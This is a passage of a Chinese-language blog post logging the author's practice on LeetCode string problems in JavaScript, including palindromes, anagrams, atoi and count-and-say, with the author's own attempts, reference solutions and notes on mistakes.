src="https://i.loli.net/2021/06/14/25jGUv4EWdwrqnT.jpg" alt="Snipaste_2021-06-14_15-22-42.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> right = s.length - <span class="number">1</span></span><br><span class="line">    <span class="keyword">let</span> queue = []</span><br><span class="line">    <span class="keyword">let</span> word = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> (s.charAt(left) === <span class="string">&#x27; &#x27;</span>) left ++</span><br><span class="line">    <span class="keyword">while</span> (s.charAt(right) === <span class="string">&#x27; &#x27;</span>) right --</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="keyword">let</span> char = s.charAt(left)</span><br><span class="line">        <span class="keyword">if</span> (char === <span class="string">&#x27; &#x27;</span> &amp;&amp; word) &#123;</span><br><span class="line">            queue.unshift(word)</span><br><span class="line">            word = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (char !== <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            word += char</span><br><span class="line">        &#125;</span><br><span class="line">        left++</span><br><span class="line">    &#125;</span><br><span class="line">    queue.unshift(word)</span><br><span class="line">    <span class="keyword">return</span> queue.join(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过unshift插入队列头部，其实跟自己写的<code>arr[count]</code>挺像。</p><p>通过charAt得到字符串的字符，好像也可以用s[i]。</p><h2 id="LeetCode387——字符串中的第一个唯一字符（☆）"><a href="#LeetCode387——字符串中的第一个唯一字符（☆）" class="headerlink" title="LeetCode387——字符串中的第一个唯一字符（☆）"></a>LeetCode387——字符串中的第一个唯一字符（☆）</h2><p><a href="https://leetcode-cn.com/problems/first-unique-character-in-a-string/">跳转地址</a></p><h3 id="自己的代码-27"><a href="#自己的代码-27" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstUniqChar = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    map.set(s[i], <span class="number">0</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    <span class="keyword">const</span> x=map.get(s[i])</span><br><span class="line">    map.set(s[i],x+<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (map.get(s[i]) === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> i</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC，但还是google了“如何让map的值自增”，最后得到7、8行结果。三段循环真又臭又长啊。</p><h3 id="思路1-amp-题解-13"><a href="#思路1-amp-题解-13" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><ol><li>遍历两次字符串，第一次构造哈希map， 存入每个字符出现的次数</li><li>第二次判断每个字符次数是否等于1，等于1就返回i</li><li>遍历结束，返回-1</li></ol><p>（和自己最初想的基本一致）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstUniqChar = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> len = s.length;</span><br><span class="line">    <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// 三目运算符，简洁多了</span></span><br><span class="line">        map[s[i]] = map[s[i]] ? map[s[i]] + <span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map[s[i]] === <span class="number">1</span>) <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度O（n）</p><h3 id="思路2-amp-题解-14"><a href="#思路2-amp-题解-14" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>唯一字符 首次出现索引 <code>=</code> 该字符最后出现索引</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstUniqChar = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++) </span><br><span class="line">        <span class="keyword">if</span> (s.indexOf(s[i]) === s.lastIndexOf(s[i]))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度O（n^2）</p><h2 id="LeetCode125——验证回文串（☆）（★）"><a href="#LeetCode125——验证回文串（☆）（★）" class="headerlink" title="LeetCode125——验证回文串（☆）（★）"></a>LeetCode125——验证回文串（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/valid-palindrome/">跳转地址</a></p><h3 id="自己的代码-28"><a href="#自己的代码-28" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.toLowerCase().split(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> n = s.length;</span><br><span class="line">  <span class="keyword">var</span> pattern = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/[a-z0-9]/</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!pattern.test(s[i])) &#123;</span><br><span class="line">      s.splice(i, <span class="number">1</span>);</span><br><span class="line">      i--</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  s = s.join(<span class="string">&quot;&quot;</span>).split(<span class="string">&quot; &quot;</span>).join(<span class="string">&quot;&quot;</span>)</span><br><span class="line">  <span class="keyword">let</span> flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">Math</span>.floor(s.length/<span class="number">2</span>); i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (s[i] !== s[s.length - i - <span class="number">1</span>]) &#123;</span><br><span class="line">      flag=<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>太折磨了。。思路很简单，就是先把字符串变成全小写的字母，然后一头一尾对比。但是遇到了<strong>各种各样的问题</strong>：以<code>&quot;A man, a plan, a canal: Panama&quot; </code>为例：</p><ol><li>用split(“”)去了空格，但是还剩下，：等特殊字符串。</li><li>用正则匹配，折腾了好久因为第一次使用。后来没看见题目说的数字，案例没通过才加了0-9。</li><li>，：等特殊字符使用splice()删除，但是删除后原数组长度变化，因此i需要自减。</li><li>操作完后的s是一个数组，join(“”)后变成<code>Aman aplan acanal Panama</code>，还是有空格。所以需要split(“ “) 再join(“”) （好麻烦）</li><li>然后又犯了个错误，判断不相等时直接return false了，其实应该用flag=false，最后return flag就行。</li></ol><h3 id="思路1-amp-题解-14"><a href="#思路1-amp-题解-14" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// s.replace(/\W/g, &quot;&quot;) 也可以这样直接匹配非一个单字字符</span></span><br><span class="line">    <span class="keyword">let</span> strArr = s.replace(<span class="regexp">/[^0-9a-zA-Z]/g</span>,<span class="string">&quot;&quot;</span>).toLowerCase().split(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> strArr.join(<span class="string">&#x27;&#x27;</span>) == strArr.reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>真的佩服。原来可以用^0-9a-zA-Z选定所有其他字符。而且正则可以直接replace，不用new一个pattern再test。（注意：<strong>只有Array才有reverse()方法，String没法调用</strong>）</p><h3 id="思路2-amp-题解-15"><a href="#思路2-amp-题解-15" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>双指针：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    s = s.replace(<span class="regexp">/[^0-9a-zA-Z]/g</span>,<span class="string">&#x27;&#x27;</span>).toLowerCase();</span><br><span class="line">    <span class="keyword">let</span> n = s.length;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> right = n-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[left] != s[right])&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        left++;</span><br><span class="line">        right--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>感觉就是败在了第一步。把这一串字符变成全小写字母竟然要花这么大力气，哎！</p><h2 id="1047-删除字符串中的所有相邻重复项（☆）（★）"><a href="#1047-删除字符串中的所有相邻重复项（☆）（★）" class="headerlink" title="1047. 删除字符串中的所有相邻重复项（☆）（★）"></a>1047. 删除字符串中的所有相邻重复项（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/remove-all-adjacent-duplicates-in-string/">跳转地址</a></p><h3 id="自己的代码-29"><a href="#自己的代码-29" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> removeDuplicates = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    s = s.split(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span>,</span><br><span class="line">        count = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[i] === s[i + <span class="number">1</span>]) &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (count !== <span class="number">1</span>) &#123;</span><br><span class="line">            s.splice(i, count);</span><br><span class="line">            i = i - count;</span><br><span class="line">        &#125;</span><br><span class="line">        count = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>splice 复杂度好像也是O（1）</p><h3 id="思路-amp-题解-14"><a href="#思路-amp-题解-14" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> removeDuplicates = <span class="function"><span class="keyword">function</span>(<span class="params">S</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> stack = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> item <span class="keyword">of</span> S)&#123;</span><br><span class="line">      <span class="keyword">if</span>(stack[stack.length - <span class="number">1</span>] === item)&#123;</span><br><span class="line">          stack.pop();</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          stack.push(item);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> stack.join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>好巧妙。。</p><h2 id="LeetCode8——字符串转换整数-atoi-（☆☆）（to-redo）"><a href="#LeetCode8——字符串转换整数-atoi-（☆☆）（to-redo）" class="headerlink" title="LeetCode8——字符串转换整数 (atoi)（☆☆）（to redo）"></a>LeetCode8——字符串转换整数 (atoi)（☆☆）（to redo）</h2><p><a href="https://leetcode-cn.com/problems/string-to-integer-atoi/">跳转地址</a></p><h3 id="自己的代码-30"><a href="#自己的代码-30" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myAtoi = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.trim();</span><br><span class="line">  <span class="keyword">let</span> n = s.length,flag=<span class="literal">true</span>,arr=[],num=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (s[<span class="number">0</span>] === <span class="string">&quot;-&quot;</span>) &#123;</span><br><span class="line">    flag = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[<span class="number">0</span>] === <span class="string">&quot;+&quot;</span>)&#123;</span><br><span class="line">    flag = <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isNaN</span>(s[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isNaN</span>(s[i])) &#123;</span><br><span class="line">      arr.push(s[i])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  num = <span class="built_in">Number</span>(arr.join(<span class="string">&quot;&quot;</span>));</span><br><span class="line">  <span class="comment">//console.log(num &lt; -Math.pow(2, 31))</span></span><br><span class="line">  <span class="keyword">if</span> (num &gt; <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span> - <span class="number">1</span>)) &#123;</span><br><span class="line">    num=<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span> - <span class="number">1</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &lt; -<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>)) &#123;</span><br><span class="line">    num=-<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag?<span class="built_in">parseInt</span>(arr.join(<span class="string">&quot;&quot;</span>)):-<span class="built_in">parseInt</span>(arr.join(<span class="string">&quot;&quot;</span>))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>好纳闷。。不难的一道题目定为medium果然有道理。就不明白了，为啥<code>console.log(num &lt; -Math.pow(2, 31)) =&gt; false</code>，而<code>console.log(-91283472332 &lt; -2147483648) =&gt; true</code> 一模一样结果咋不同？</p><p><strong>心态崩了呀，明天再整</strong></p><h3 id="思路-amp-题解-15"><a href="#思路-amp-题解-15" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>题目即JavaScript中的<code>parseInt()</code>这一API的转换规则，但这样写面试肯定过不了，考验的是基本功。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myAtoi = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="built_in">parseInt</span>(str, <span class="number">10</span>); <span class="comment">// 10最好写上，未防止str以&quot;0x&quot;或者&quot;0X&quot;开头或者&quot;0&quot;开头。</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isNaN</span>(number)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number &lt; <span class="built_in">Math</span>.pow(-<span class="number">2</span>, <span class="number">31</span>) || number &gt; <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>) - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> number &lt; <span class="built_in">Math</span>.pow(-<span class="number">2</span>, <span class="number">31</span>) ? <span class="built_in">Math</span>.pow(-<span class="number">2</span>, <span class="number">31</span>) : <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>) - <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-16"><a href="#思路2-amp-题解-16" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>挺清晰的，以后要多写写。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myAtoi = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span>, sign = <span class="number">1</span>, total = <span class="number">0</span>, length = str.length;</span><br><span class="line">    <span class="comment">// 1.Empty string</span></span><br><span class="line">    <span class="keyword">if</span> (length === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 2.Remove Spaces 因为 str 是 immutable 的, 所以使用 trim 会带来额外的空间</span></span><br><span class="line">    <span class="keyword">while</span> (str.charAt(index) === <span class="string">&#x27; &#x27;</span> &amp;&amp; index &lt; length) &#123;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3.Handle signs</span></span><br><span class="line">    <span class="keyword">if</span> (str.charAt(index) === <span class="string">&#x27;+&#x27;</span> || str.charAt(index) === <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">        sign = str.charAt(index) === <span class="string">&#x27;-&#x27;</span> ? -<span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> MAX_SAFE_32_INT = <span class="built_in">Math</span>.pow(<span class="number">2</span>,<span class="number">31</span>) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">const</span> MIN_SAFE_32_INT = -<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">31</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4.Convert number and avoid overflow</span></span><br><span class="line">    <span class="keyword">while</span> (index &lt; length &amp;&amp; str[index].match(<span class="regexp">/[0-9]/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> digit = str.charAt(index) - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (digit &lt; <span class="number">0</span> || digit &gt; <span class="number">9</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// check if total will be overflow after 10 times and add digit</span></span><br><span class="line">        <span class="keyword">if</span> (total &gt; <span class="built_in">Math</span>.floor(MAX_SAFE_32_INT / <span class="number">10</span>) ||</span><br><span class="line">        (total === <span class="built_in">Math</span>.floor(MAX_SAFE_32_INT / <span class="number">10</span>) &amp;&amp; digit &gt; MAX_SAFE_32_INT % <span class="number">10</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (sign === <span class="number">1</span>) ? MAX_SAFE_32_INT  : MIN_SAFE_32_INT ;</span><br><span class="line">        &#125;</span><br><span class="line">        total = total * <span class="number">10</span> + digit;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total * sign;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode38——外观数列（☆☆）-to-redo"><a href="#LeetCode38——外观数列（☆☆）-to-redo" class="headerlink" title="LeetCode38——外观数列（☆☆）(to redo)"></a>LeetCode38——外观数列（☆☆）(to redo)</h2><p><a href="https://leetcode-cn.com/problems/count-and-say/">跳转地址</a></p><h3 id="自己的代码-31"><a href="#自己的代码-31" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>看见递归就没有思路了。。</p><h3 id="思路-amp-题解-16"><a href="#思路-amp-题解-16" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>递归+正则：</p><ul><li>/(\d)\1*/g  这个正则表示，全局匹配，匹配一位数字或者匹配相同的多位数字。 (\d)\1匹配两个连续数字字符，因为\1是对(\d)的引用。 *修饰\1，表示可以有0或多个。</li><li>对n-1时产生的数组，用 length+值  确定n的数组。比如，[‘21’]=&gt;’2’的length+’2’  +  ‘1’的length+’1’=&gt;’1211’</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> countAndSay = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> temp = countAndSay(n-<span class="number">1</span>).match(<span class="regexp">/(\d)\1*/g</span>)</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; temp.length; i++) &#123;</span><br><span class="line">        result += (temp[i].length + <span class="string">&#x27;&#x27;</span> + temp[i].substring(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode58——最后一个单词的长度（☆）"><a href="#LeetCode58——最后一个单词的长度（☆）" class="headerlink" title="LeetCode58——最后一个单词的长度（☆）"></a>LeetCode58——最后一个单词的长度（☆）</h2><p><a href="https://leetcode-cn.com/problems/length-of-last-word/">跳转地址</a></p><h3 id="思路-amp-题解-17"><a href="#思路-amp-题解-17" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lengthOfLastWord = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.trim().split(<span class="string">&quot; &quot;</span>).pop().length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这类题目一定要熟练运用 api 啦。</p><h2 id="LeetCode541——反转字符串-II（☆）"><a href="#LeetCode541——反转字符串-II（☆）" class="headerlink" title="LeetCode541——反转字符串 II（☆）"></a>LeetCode541——反转字符串 II（☆）</h2><p><a href="https://leetcode-cn.com/problems/reverse-string-ii/">跳转地址</a></p><p>还是不熟练啊。</p><h3 id="思路-amp-题解-18"><a href="#思路-amp-题解-18" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseStr = <span class="function"><span class="keyword">function</span> (<span class="params">s, k</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i += <span class="number">2</span> * k)&#123;</span><br><span class="line">        res += s.slice(i, i + k).split(<span class="string">&quot;&quot;</span>).reverse().join(<span class="string">&quot;&quot;</span>) + s.slice(i + k, i + <span class="number">2</span> * k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode49——字母异位词分组（☆☆）"><a href="#LeetCode49——字母异位词分组（☆☆）" class="headerlink" title="LeetCode49——字母异位词分组（☆☆）"></a>LeetCode49——字母异位词分组（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/group-anagrams/">跳转地址</a></p><h3 id="自己的代码-32"><a href="#自己的代码-32" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> groupAnagrams = <span class="function"><span class="keyword">function</span> (<span class="params">strs</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = &#123;&#125;, res = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> strs) &#123;</span><br><span class="line">    <span class="keyword">let</span> str = i.split(<span class="string">&#x27;&#x27;</span>).sort().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    map[str] ? map[str].push(i) : map[str] = [i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> map) &#123;</span><br><span class="line">    res.push(map[i])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode438——找到字符串中所有字母异位词（☆☆）-to-redo"><a href="#LeetCode438——找到字符串中所有字母异位词（☆☆）-to-redo" class="headerlink" title="LeetCode438——找到字符串中所有字母异位词（☆☆）(to redo)"></a>LeetCode438——找到字符串中所有字母异位词（☆☆）(to redo)</h2><p><a href="https://leetcode-cn.com/problems/find-all-anagrams-in-a-string/">跳转地址</a></p><h3 id="思路1-amp-题解-15"><a href="#思路1-amp-题解-15" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findAnagrams = <span class="function"><span class="keyword">function</span>(<span class="params">s, p</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">if</span> (p.length &gt; s.length) <span class="keyword">return</span> result;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> right = p.length;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span>(left &lt; s.length) &#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = s.substring(left,right);</span><br><span class="line">    <span class="keyword">if</span> ( tmp.split(<span class="string">&#x27;&#x27;</span>).sort().join(<span class="string">&#x27;&#x27;</span>) === p.split(<span class="string">&#x27;&#x27;</span>).sort().join(<span class="string">&#x27;&#x27;</span>))&#123;</span><br><span class="line">      result.push(left);</span><br><span class="line">    &#125;</span><br><span class="line">    left++;</span><br><span class="line">    right++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>虽然超时，但是其他题解真看不懂诶。。</p><h3 id="思路2-amp-题解（to-understand）"><a href="#思路2-amp-题解（to-understand）" class="headerlink" title="思路2&amp;题解（to understand）"></a>思路2&amp;题解（to understand）</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> findAnagrams = <span class="function">(<span class="params">s, p</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> output = [], neededChars = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> char <span class="keyword">of</span> p) &#123;</span><br><span class="line">        neededChars[char] ? neededChars[char]++ : neededChars[char] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> right = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">let</span> count = p.length </span><br><span class="line">    <span class="keyword">while</span> (right &lt; s.length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (neededChars[s[right]] &gt; <span class="number">0</span>) count--;</span><br><span class="line">        neededChars[s[right]]--;</span><br><span class="line">        right++;</span><br><span class="line">        <span class="keyword">if</span> (count === <span class="number">0</span>) output.push(left);</span><br><span class="line">        <span class="keyword">if</span> (right - left == p.length) &#123;</span><br><span class="line">            <span class="keyword">if</span> (neededChars[s[left]] &gt;= <span class="number">0</span>) count++;</span><br><span class="line">            neededChars[s[left]]++;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode680——验证回文字符串-Ⅱ（☆）-to-redo"><a href="#LeetCode680——验证回文字符串-Ⅱ（☆）-to-redo" class="headerlink" title="LeetCode680——验证回文字符串 Ⅱ（☆）(to redo)"></a>LeetCode680——验证回文字符串 Ⅱ（☆）(to 